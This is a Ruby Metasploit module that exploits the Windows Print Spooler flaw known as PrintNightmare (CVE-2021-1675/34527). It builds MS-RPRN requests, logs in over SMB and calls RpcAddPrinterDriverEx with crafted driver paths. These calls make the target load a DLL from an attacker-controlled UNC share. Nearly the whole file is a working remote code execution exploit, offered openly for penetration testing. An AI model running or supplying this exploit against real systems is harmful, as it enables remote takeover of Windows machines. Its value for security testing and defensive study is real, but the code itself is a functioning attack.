##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'windows_error'
require 'ruby_smb'
require 'ruby_smb/error'

module PrintSystem
  UUID = '12345678-1234-abcd-ef00-0123456789ab'.freeze
  VER_MAJOR = 1
  VER_MINOR = 0

  # Operation numbers
  RPC_ENUM_PRINTER_DRIVERS = 10
  RPC_GET_PRINTER_DRIVER_DIRECTORY = 12
  RPC_ADD_PRINTER_DRIVER_EX = 89

  # see: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/b96cc497-59e5-4510-ab04-5484993b259b
  APD_STRICT_UPGRADE = 0x00000001
  APD_STRICT_DOWNGRADE = 0x00000002
  APD_COPY_ALL_FILES = 0x00000004
  APD_COPY_NEW_FILES = 0x00000008
  APD_COPY_FROM_DIRECTORY = 0x00000010
  APD_DONT_COPY_FILES_TO_CLUSTER = 0x00001000
  APD_COPY_TO_ALL_SPOOLERS = 0x00002000
  APD_INSTALL_WARNED_DRIVER = 0x00008000
  APD_RETURN_BLOCKING_STATUS_CODE = 0x00010000

  # [2.2.1.5.2 DRIVER_INFO_2](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/39bbfc30-8768-4cd4-9930-434857e2c2a2)
  class DriverInfo2 < BinData::Record
    endian :little

    uint32     :c_version
    uint32     :p_name_ref_id
    uint32     :p_environment_ref_id
    uint32     :p_driver_path_ref_id
    uint32     :p_data_file_ref_id
    uint32     :p_config_file_ref_id
    ndr_string :p_name, only_if: -> { p_name_ref_id != 0 }
    string     :pad1, length: -> { pad_length(p_name) }
    ndr_string :p_environment, only_if: -> { p_name_ref_id != 0 }
    string     :pad2, length: -> { pad_length(p_environment) }
    ndr_string :p_driver_path, only_if: -> { p_name_ref_id != 0 }
    string     :pad3, length: -> { pad_length(p_driver_path) }
    ndr_string :p_data_file, only_if: -> { p_name_ref_id != 0 }
    string     :pad4, length: -> { pad_length(p_data_file) }
    ndr_string :p_config_file, only_if: -> { p_name_ref_id != 0 }
    string     :pad5, length: -> { pad_length(p_config_file) }

    def pad_length(prev_element)
      offset = (prev_element.abs_offset + prev_element.to_binary_s.length) % 4
      (4 - offset) % 4
    end
  end

  class PDriverInfo2 < RubySMB::Dcerpc::Ndr::NdrPointer
    endian :little

    driver_info2 :referent, onlyif: -> { referent_id != 0 }
  end

  # [2.2.1.2.3 DRIVER_CONTAINER](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/3a3f9cf7-8ec4-4921-b1f6-86cf8d139bc2)
  class DriverContainer < BinData::Record
    endian :little

    uint32               :level, check_value: -> { [2].include?(value) }
    uint32               :tag
    choice :driver_info, selection: :level do
      p_driver_info2 2
    end
  end

  # [3.1.4.4.8 RpcAddPrinterDriverEx (Opnum 89)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/b96cc497-59e5-4510-ab04-5484993b259b)
  class RpcAddPrinterDriverExRequest < BinData::Record
    attr_reader :opnum

    endian :little

    ndr_lp_str       :p_name
    string           :pad1, length: -> { pad_length(p_name) }
    driver_container :p_driver_container
    string           :pad2, length: -> { pad_length(p_driver_container) }
    uint32           :dw_file_copy_flags

    def initialize_instance
      super
      @opnum = RPC_ADD_PRINTER_DRIVER_EX
    end

    # Determines the correct length for the padding, so that the next
    # field is 4-byte aligned.
    def pad_length(prev_element)
      offset = (prev_element.abs_offset + prev_element.to_binary_s.length) % 4
      (4 - offset) % 4
    end
  end

  # [3.1.4.4.8 RpcAddPrinterDriverEx (Opnum 89)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/b96cc497-59e5-4510-ab04-5484993b259b)
  class RpcAddPrinterDriverExResponse < BinData::Record
    attr_reader :opnum

    endian :little

    def initialize_instance
      super
      @opnum = RPC_ADD_PRINTER_DRIVER_EX
    end

    uint32 :error_status
  end

  # for RpcEnumPrinterDrivers and RpcGetPrinterDriverDirectory `BYTE*` fields
  class NdrLpLpByte < RubySMB::Dcerpc::Ndr::NdrPointer
    endian :little

    ndr_lp_byte :referent, onlyif: -> { referent_id != 0 }
  end

  # [3.1.4.4.2 RpcEnumPrinterDrivers (Opnum 10)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/857d00ac-3682-4a0d-86ca-3d3c372e5e4a)
  class RpcEnumPrinterDriversRequest < BinData::Record
    attr_reader :opnum

    endian :little

    def initialize_instance
      super
      @opnum = RPC_ENUM_PRINTER_DRIVERS
    end

    ndr_lp_str          :p_name
    string              :pad1, length: -> { pad_length(p_name) }
    ndr_lp_str          :p_environment
    string              :pad2, length: -> { pad_length(p_environment) }
    uint32              :level
    ndr_lp_lp_byte      :p_drivers
    string              :pad3, length: -> { pad_length(p_drivers) }
    uint32              :cb_buf

    # Determines the correct length for the padding, so that the next
    # field is 4-byte aligned.
    def pad_length(prev_element)
      offset = (prev_element.abs_offset + prev_element.to_binary_s.length) % 4
      (4 - offset) % 4
    end
  end

  # [3.1.4.4.2 RpcEnumPrinterDrivers (Opnum 10)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/857d00ac-3682-4a0d-86ca-3d3c372e5e4a)
  class RpcEnumPrinterDriversResponse < BinData::Record
    attr_reader :opnum

    endian :little

    def initialize_instance
      super
      @opnum = RPC_ENUM_PRINTER_DRIVERS
    end

    ndr_lp_lp_byte    :p_drivers
    string            :pad1, length: -> { pad_length(p_drivers) }
    uint32            :pcb_needed
    uint32            :pc_returned
    uint32            :error_status

    # Determines the correct length for the padding, so that the next
    # field is 4-byte aligned.
    def pad_length(prev_element)
      offset = (prev_element.abs_offset + prev_element.to_binary_s.length) % 4
      (4 - offset) % 4
    end
  end

  # [3.1.4.4.4 RpcGetPrinterDriverDirectory (Opnum 12)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/9df11cf4-4098-4852-ad72-d1f75a82bffe)
  class RpcGetPrinterDriverDirectoryRequest < BinData::Record
    attr_reader :opnum

    endian :little

    def initialize_instance
      super
      @opnum = RPC_GET_PRINTER_DRIVER_DIRECTORY
    end

    ndr_lp_str          :p_name
    string              :pad1, length: -> { pad_length(p_name) }
    ndr_lp_str          :p_environment
    string              :pad2, length: -> { pad_length(p_environment) }
    uint32              :level
    ndr_lp_lp_byte      :p_driver_directory
    string              :pad3, length: -> { pad_length(p_driver_directory) }
    uint32              :cb_buf

    # Determines the correct length for the padding, so that the next
    # field is 4-byte aligned.
    def pad_length(prev_element)
      offset = (prev_element.abs_offset + prev_element.to_binary_s.length) % 4
      (4 - offset) % 4
    end
  end

  # [3.1.4.4.4 RpcGetPrinterDriverDirectory (Opnum 12)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/9df11cf4-4098-4852-ad72-d1f75a82bffe)
  class RpcGetPrinterDriverDirectoryResponse < BinData::Record
    attr_reader :opnum

    endian :little

    def initialize_instance
      super
      @opnum = RPC_GET_PRINTER_DRIVER_DIRECTORY
    end

    ndr_lp_lp_byte    :p_driver_directory
    string            :pad1, length: -> { pad_length(p_driver_directory) }
    uint32            :pcb_needed
    uint32            :error_status

    # Determines the correct length for the padding, so that the next
    # field is 4-byte aligned.
    def pad_length(prev_element)
      offset = (prev_element.abs_offset + prev_element.to_binary_s.length) % 4
      (4 - offset) % 4
    end
  end
end

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::DCERPC
  include Msf::Exploit::Remote::SMB::Client::Authenticated

  # PrintSystem = RubySMB::Dcerpc::PrintSystem

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Print Spooler Remote DLL Injection',
        'Description' => %q{
          The print spooler service can be abused to load a remote DLL through a
          crafted DCERPC request.
        },
        'Author' => [
          'Zhiniang Peng',           # vulnerability discovery / research
          'Xuefeng Li',              # vulnerability discovery / research
          'Zhipeng Huo',             # vulnerability discovery
          'Piotr Madej',             # vulnerability discovery
          'Zhang Yunhai',            # vulnerability discovery
          'cube0x0',                 # PoC
          'Spencer McIntyre',        # metasploit module
          'Christophe De La Fuente', # metasploit module co-author
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2021-1675'],
          ['CVE', '2021-34527'],
          ['URL', 'https://github.com/cube0x0/CVE-2021-1675'],
          ['URL', 'https://github.com/afwu/PrintNightmare'],
          ['URL', 'https://github.com/calebstewart/CVE-2021-1675/blob/main/CVE-2021-1675.ps1']
        ],
        'Notes' => {
          'AKA' => [ 'PrintNightmare' ],
          'Stability' => [CRASH_SAFE],
          'Reliability' => [
            UNRELIABLE_SESSION # appears to fail after succeeding once until the server is restarted
          ],
          'SideEffects' => [
            ARTIFACTS_ON_DISK # the dll will be copied to the remote server
          ]
        }
      )
    )

    register_options(
      [
        OptPort.new('RPORT', [ false, 'The netlogon RPC port' ]),
        OptString.new('UNC_PATH', [ true, 'The UNC path the the DLL that the server should load' ]),
      ]
    )
  end

  def run
    begin
      connect
    rescue Rex::ConnectionError
      fail_with(Failure::Unreachable, 'Failed to connect to the remote service.')
    end

    begin
      smb_login
    rescue Rex::Proto::SMB::Exceptions::LoginError
      fail_with(Failure::NoAccess, 'Failed to authenticate to the remote service.')
    end

    arch = dcerpc_getarch
    print_status("Target environment: Windows v#{simple.client.os_version} (#{arch})")

    # see: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/e81cbc09-ab05-4a32-ae4a-8ec57b436c43
    if arch == ARCH_X64
      environment = 'Windows x64'
    elsif arch == ARCH_X86
      environment = 'Windows NT x86'
    else
      fail_with(Failure::NoTarget, 'Only x86 and x64 targets are supported')
    end

    handle = dcerpc_handle(PrintSystem::UUID, '1.0', 'ncacn_np', ['\\spoolss'])
    vprint_status("Binding to #{handle} ...")
    begin
      dcerpc_bind(handle)
    rescue RubySMB::Error::UnexpectedStatusCode => e
      nt_status = ::WindowsError::NTStatus.find_by_retval(e.status_code.value).first
      fail_with(Failure::Unreachable, "The DCERPC bind failed with error #{nt_status.name} (#{nt_status.description})")
    end
    vprint_status("Bound to #{handle} ...")

    print_status('Enumerating the installed printer drivers...')
    drivers = enum_printer_drivers(environment)
    driver_path = "#{drivers.driver_path.rpartition('\\').first}\\UNIDRV.DLL"
    vprint_status("Using driver path: #{driver_path}")

    config_directory = get_printer_driver_directory(environment)
    vprint_status("Using directory: #{config_directory}")

    filename = datastore['UNC_PATH'].rpartition('\\').last
    container = PrintSystem::DriverContainer.new(
      level: 2,
      tag: 2,
      driver_info: PrintSystem::DriverInfo2.new(
        c_version: 3,
        p_name_ref_id: 0x00020000,
        p_environment_ref_id: 0x00020004,
        p_driver_path_ref_id: 0x00020008,
        p_data_file_ref_id: 0x0002000c,
        p_config_file_ref_id: 0x00020010,
        # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/4464eaf0-f34f-40d5-b970-736437a21913
        p_name: "#{Rex::Text.rand_text_alpha_upper(2..4)} #{Rex::Text.rand_text_numeric(2..3)}",
        p_environment: environment,
        p_driver_path: driver_path,
        p_data_file: datastore['UNC_PATH'],
        p_config_file: 'C:\\Windows\\System32\\kernel32.dll'
      )
    )

    flags = PrintSystem::APD_INSTALL_WARNED_DRIVER | PrintSystem::APD_COPY_FROM_DIRECTORY | PrintSystem::APD_COPY_ALL_FILES
    add_printer_driver_ex("\\\\#{datastore['RHOST']}", container, flags)

    1.upto(3) do |directory|
      container.driver_info.p_config_file.assign("#{config_directory}\\3\\old\\#{directory}\\#{filename}")
      add_printer_driver_ex("\\\\#{datastore['RHOST']}", container, flags)
    end
  end

  def enum_printer_drivers(environment)
    response = rprn_call('RpcEnumPrinterDrivers', p_environment: environment, level: 2)
    response = rprn_call('RpcEnumPrinterDrivers', p_environment: environment, level: 2, p_drivers: [0] * response.pcb_needed, cb_buf: response.pcb_needed)
    DriverInfo2.read(response.p_drivers.referent.value.map(&:chr).join)
  end

  def get_printer_driver_directory(environment)
    response = rprn_call('RpcGetPrinterDriverDirectory', p_environment: environment, level: 2)
    response = rprn_call('RpcGetPrinterDriverDirectory', p_environment: environment, level: 2, p_driver_directory: [0] * response.pcb_needed, cb_buf: response.pcb_needed)
    RubySMB::Field::Stringz16.read(response.p_driver_directory.referent.value.map(&:chr).join).encode('ASCII-8BIT')
  end

  def add_printer_driver_ex(name, container, flags)
    begin
      response = rprn_call('RpcAddPrinterDriverEx', p_name: name, p_driver_container: container, dw_file_copy_flags: flags)
    rescue RubySMB::Error::UnexpectedStatusCode => e
      nt_status = ::WindowsError::NTStatus.find_by_retval(e.status_code.value).first
      message = "Error #{nt_status.name} (#{nt_status.description})"
      if nt_status == ::WindowsError::NTStatus::STATUS_PIPE_BROKEN
        # STATUS_PIPE_BROKEN is the return value when the payload is executed, so this is somewhat expected
        vprint_status(message)
      else
        print_error(message)
      end

      return
    end

    message = "RpcAddPrinterDriverEx response #{response.error_status}"
    errors = ::WindowsError::Win32.find_by_retval(response.error_status.value)
    unless errors.empty?
      error = errors.first
      message << " #{error.name} (#{error.description})"
    end
    vprint_status(message)

    response
  end

  def rprn_call(name, **kwargs)
    request = PrintSystem.const_get("#{name}Request").new(**kwargs)

    begin
      raw_response = dcerpc.call(request.opnum, request.to_binary_s)
    rescue Rex::Proto::DCERPC::Exceptions::Fault => e
      fail_with(Failure::UnexpectedReply, "The #{name} Print System RPC request failed (#{e.message}).")
    end

    PrintSystem.const_get("#{name}Response").read(raw_response)
  end

  class DriverInfo2Header < BinData::Record
    endian :little

    uint32     :c_version
    uint32     :name_offset
    uint32     :environment_offset
    uint32     :driver_path_offset
    uint32     :data_file_offset
    uint32     :config_file_offset
  end

  # this is a partial implementation that just parses the data, this is *not* the same struct as PrintSystem::DriverInfo2
  # see: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/2825d22e-c5a5-47cd-a216-3e903fd6e030
  DriverInfo2 = Struct.new(:header, :name, :environment, :driver_path, :data_file, :config_file) do
    def self.read(data)
      header = DriverInfo2Header.read(data)
      new(
        header,
        RubySMB::Field::Stringz16.read(data[header.name_offset..-1]).encode('ASCII-8BIT'),
        RubySMB::Field::Stringz16.read(data[header.environment_offset..-1]).encode('ASCII-8BIT'),
        RubySMB::Field::Stringz16.read(data[header.driver_path_offset..-1]).encode('ASCII-8BIT'),
        RubySMB::Field::Stringz16.read(data[header.data_file_offset..-1]).encode('ASCII-8BIT'),
        RubySMB::Field::Stringz16.read(data[header.config_file_offset..-1]).encode('ASCII-8BIT')
      )
    end
  end
end
